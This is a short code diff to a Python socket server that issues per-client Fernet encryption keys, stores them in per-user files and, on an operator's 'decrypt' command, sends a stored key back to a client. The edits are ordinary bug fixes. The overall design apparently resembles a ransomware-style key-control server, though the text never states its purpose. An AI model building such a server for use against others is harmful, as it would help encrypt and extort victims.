@@ -43,7 +43,6 @@ class Server():
         self.port = port
         self.threads = {}
         self.inp = ''
-        self.Users = os.scandir("Users")
 
     def keyGen(self, id: str) -> bytes:
         key = Fernet.generate_key()
@@ -53,12 +52,10 @@ class Server():
 
     def thread_check(self, new_thread: ClientThread, userId: str) -> None:
         print(userId)
-        print(self.Users)
-        for t in self.Users:
-            print(t)
-            if new_thread.id == t:
-                new_thread.conn.send(b"wait")
-                return
+
+        if userId in self.threads:
+            new_thread.conn.send(b"wait")
+            return
         
         new_thread.conn.send(self.keyGen(userId))
         self.threads[userId] = new_thread
@@ -71,7 +68,7 @@ class Server():
                 new_thread = ClientThread(self.host, self.port, conn, self.thread_check)
                 new_thread.start()
             
-    def sig_dec(key: str, user: ClientThread) -> None:
+    def sig_dec(self, key: str, user: ClientThread) -> None:
         user.conn.send(bytes(key, "Utf-8"))
 
     def inputThread(self) -> str:
@@ -81,12 +78,17 @@ class Server():
             if self.inp == "kill":
                 return
             
-            cmd = self.inp.split(' ')[0]
-            user = self.inp.split(' ')[1]
+            cmd = self.inp.split(' ')
+            if len(cmd) > 1:
+                user = cmd[1]
+                cmd = cmd[0]
+            else:
+                continue
+
             if cmd == "decrypt":
                 with open(os.path.join('Users', user), 'r') as userfile:
                     key = userfile.readline()
-                    print(key)
+                    print(key)                   
                     self.sig_dec(key, self.threads[user])
 
     def inputLoop(self) -> None:
